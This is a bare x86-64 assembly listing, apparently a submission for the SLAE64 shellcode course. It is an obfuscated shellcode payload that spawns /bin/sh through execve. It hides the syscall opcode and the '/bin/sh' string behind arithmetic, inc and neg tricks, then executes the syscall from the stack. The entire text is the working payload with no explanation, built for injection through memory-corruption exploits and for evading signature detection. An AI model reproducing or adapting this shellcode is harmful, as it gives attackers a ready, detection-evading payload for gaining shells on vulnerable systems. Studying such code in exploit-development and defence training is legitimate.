;Sathish Kumar L SLAE64 - 1408
global _start

_start:

	xor esi, esi
    xor r15, r15
    mov r15w, 0x161f
    sub r15w, 0x1110
    push r15
    mov r15, rsp
    mov rdi, 0xff978cd091969dd0
    inc rdi
    neg rdi
    mul esi
    add al, 0x3b
    push rdi
    push rsp
    pop rdi
    call r15
